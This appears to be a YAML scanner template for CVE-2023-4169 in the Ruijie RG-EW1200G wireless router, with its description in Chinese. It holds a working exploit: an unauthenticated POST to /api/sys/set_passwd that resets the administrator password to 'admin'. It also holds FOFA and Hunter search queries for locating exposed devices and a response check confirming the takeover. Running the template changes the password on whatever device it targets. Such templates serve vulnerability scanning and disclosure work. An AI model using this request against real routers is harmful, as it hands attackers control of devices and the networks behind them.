id: CVE-2023-4169

info:
  name: 锐捷(ruijie)RG-EW1200G路由器 未授权后台登录密码修改（谨慎使用）
  author: Y3y1ng
  severity: high
  verified: true
  description: |
    Ruijie Networks RG-EW1200G是中国锐捷网络（Ruijie Networks）公司的一款无线路由器。
    锐捷网络RG-EW1200G路由器 存在未授权修改后台登录密码漏洞，允许未授权用户修改管理员密码、登录路由器、获取敏感信息、控制内部网络。
    该漏洞源于文件/api/sys/set_passwd存在访问控制错误漏洞。
    【登录密码】:admin
    FOFA: "锐捷" && port="6060"
    FOFA: body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
    HUNTER：web.body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4169
    - https://github.com/blakespire/repoforcve/tree/main/RG-EW1200G
  tags: cve,cve2023,ruijie,router
  created: 2023/09/21

rules:
  r0: 
    request:
      method: POST
      path: /api/sys/set_passwd
      body: |
        {
        "username":"web",
        "admin_new":"admin"
        }
      follow_redirects: true
    expression: >-
      response.status == 200 &&
      response.body.bcontains(b'\"ok\"') &&
      response.body.bcontains(b'友情提示') 
expression: r0()